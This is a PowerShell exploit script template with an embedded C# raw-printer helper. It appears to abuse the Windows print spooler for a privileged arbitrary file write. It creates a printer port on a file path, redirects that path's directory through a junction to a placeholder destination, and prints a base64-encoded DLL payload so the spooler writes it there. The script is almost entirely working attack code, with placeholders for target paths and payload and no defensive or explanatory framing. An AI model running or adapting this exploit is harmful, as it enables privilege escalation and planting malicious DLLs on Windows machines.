# Import-Module NtObjectManager -ErrorAction Ignore

$Ref = (
"System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
"System.Runtime.InteropServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
);

$MethodDefinition = @"
    using System;
    using System.IO;
    using System.Runtime.InteropServices;
    namespace Printer {
        public class RawPrinterHelper
        {
            // Structure and API declarions:
            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
            public class DOCINFOA
            {
                [MarshalAs(UnmanagedType.LPStr)]
                public string pDocName;
                [MarshalAs(UnmanagedType.LPStr)]
                public string pOutputFile;
                [MarshalAs(UnmanagedType.LPStr)]
                public string pDataType;
            }
            [DllImport("winspool.Drv", EntryPoint = "OpenPrinterA", SetLastError = true, CharSet = CharSet.Ansi, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
            public static extern bool OpenPrinter([MarshalAs(UnmanagedType.LPStr)] string szPrinter, out IntPtr hPrinter, IntPtr pd);
            [DllImport("winspool.Drv", EntryPoint = "ClosePrinter", SetLastError = true, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
            public static extern bool ClosePrinter(IntPtr hPrinter);
            [DllImport("winspool.Drv", EntryPoint = "StartDocPrinterA", SetLastError = true, CharSet = CharSet.Ansi, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
            public static extern bool StartDocPrinter(IntPtr hPrinter, Int32 level, [In, MarshalAs(UnmanagedType.LPStruct)] DOCINFOA di);
            [DllImport("winspool.Drv", EntryPoint = "EndDocPrinter", SetLastError = true, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
            public static extern bool EndDocPrinter(IntPtr hPrinter);
            [DllImport("winspool.Drv", EntryPoint = "StartPagePrinter", SetLastError = true, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
            public static extern bool StartPagePrinter(IntPtr hPrinter);
            [DllImport("winspool.Drv", EntryPoint = "EndPagePrinter", SetLastError = true, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
            public static extern bool EndPagePrinter(IntPtr hPrinter);
            [DllImport("winspool.Drv", EntryPoint = "WritePrinter", SetLastError = true, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
            public static extern bool WritePrinter(IntPtr hPrinter, IntPtr pBytes, Int32 dwCount, out Int32 dwWritten);
            // SendBytesToPrinter()
            // When the function is given a printer name and an unmanaged array
            // of bytes, the function sends those bytes to the print queue.
            // Returns true on success, false on failure.
            public static bool SendBytesToPrinter(string szPrinterName, IntPtr pBytes, Int32 dwCount)
            {
                Int32 dwError = 0, dwWritten = 0;
                IntPtr hPrinter = new IntPtr(0);
                DOCINFOA di = new DOCINFOA();
                bool bSuccess = false; // Assume failure unless you specifically succeed.
                di.pDocName = "My C#.NET RAW Document";
                di.pDataType = "RAW";
                // Open the printer.
                if (OpenPrinter(szPrinterName.Normalize(), out hPrinter, IntPtr.Zero))
                {
                    // Start a document.
                    if (StartDocPrinter(hPrinter, 1, di))
                    {
                        // Start a page.
                        if (StartPagePrinter(hPrinter))
                        {
                            // Write your bytes.
                            bSuccess = WritePrinter(hPrinter, pBytes, dwCount, out dwWritten);
                            EndPagePrinter(hPrinter);
                        }
                        EndDocPrinter(hPrinter);
                    }
                    ClosePrinter(hPrinter);
                }
                // If you did not succeed, GetLastError may give more information
                // about why not.
                if (bSuccess == false)
                {
                    dwError = Marshal.GetLastWin32Error();
                }
                return bSuccess;
            }
        }
    }
"@;

Add-Type -ReferencedAssemblies $Ref -TypeDefinition $MethodDefinition -Language CSharp;

Remove-Printer -Name PRINTER_NAME -ErrorAction SilentlyContinue | Out-Null

Remove-PrinterPort -Name JUNCTION_FILEPATH -ErrorAction SilentlyContinue | Out-Null

Add-PrinterDriver -Name "Generic / Text Only"

mkdir "JUNCTION_PATH" | Out-Null

Add-PrinterPort -Name JUNCTION_FILEPATH  | Out-Null

Write-Host "[+] Added PrinterPort successfully on JUNCTION_FILEPATH"

Remove-Item -Recurse -Force JUNCTION_PATH -ErrorAction SilentlyContinue | Out-Null

New-Item -Type Junction -Path JUNCTION_PATH -Value DESTINATION_PATH | Out-Null

Write-Host "[+] Mount point created successfully on DESTINATION_PATH"

Add-Printer -Name "PRINTER_NAME" -DriverName "Generic / Text Only" -PortName "JUNCTION_FILEPATH" | Out-Null

$PE =  [System.Convert]::FromBase64String('B64_PAYLOAD_DLL')
[IntPtr] $unmanaged = ([system.runtime.interopservices.marshal]::AllocHGlobal($pe.Length));
[system.runtime.interopservices.marshal]::Copy($PE, 0, $unmanaged, $PE.Length);
[Printer.RawPrinterHelper]::SendBytesToPrinter("PRINTER_NAME", $unmanaged, $PE.Length);

